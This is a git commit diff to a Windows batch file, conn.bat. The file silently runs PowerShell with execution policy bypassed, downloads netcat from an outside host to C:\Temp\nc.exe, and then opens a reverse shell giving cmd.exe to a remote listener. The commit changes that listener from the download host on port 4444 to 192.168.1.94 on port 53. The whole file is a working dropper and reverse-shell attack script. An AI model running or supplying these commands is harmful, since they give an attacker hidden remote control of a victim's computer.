0e72420d36ca55e4ddc851f5fd40d02dc5d16c13
code404nul <84344873+code404nul@users.noreply.github.com>
2022-02-15 11:37:37 +0100

    Update conn.bat

--- conn.bat
+++ conn.bat
@@ -1,3 +1,3 @@
 powershell -Command "powershell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http:/megavirusdelamort.lestutosdeprocessus.fr/nc.zip','C:\Temp\nc.exe');"
 
-C:\Temp\nc.exe -e cmd.exe megavirusdelamort.lestutosdeprocessus.fr 4444
+C:\Temp\nc.exe -e cmd.exe 192.168.1.94 53 
